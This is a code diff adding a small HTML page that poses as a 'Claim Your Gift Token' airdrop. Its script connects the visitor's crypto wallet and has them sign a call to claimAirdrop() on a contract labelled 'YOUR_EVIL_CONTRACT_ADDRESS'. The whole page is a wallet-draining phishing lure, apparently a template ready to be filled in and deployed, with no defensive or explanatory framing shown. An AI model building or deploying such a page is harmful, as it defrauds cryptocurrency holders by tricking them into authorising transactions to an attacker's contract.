@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head><title>Claim Your Gift Token</title></head>
+  <body>
+    <h2>🎁 You’ve received GIFT tokens!</h2>
+    <button onclick="connect()">Connect Wallet</button>
+
+    <script>
+      async function connect() {
+        const provider = window.ethereum;
+        await provider.request({ method: 'eth_requestAccounts' });
+
+        const signer = (new ethers.providers.Web3Provider(provider)).getSigner();
+        const contract = new ethers.Contract(
+          "YOUR_EVIL_CONTRACT_ADDRESS",
+          ["function claimAirdrop() public"],
+          signer
+        );
+
+        await contract.claimAirdrop();
+      }
+    </script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+  </body>
+</html>
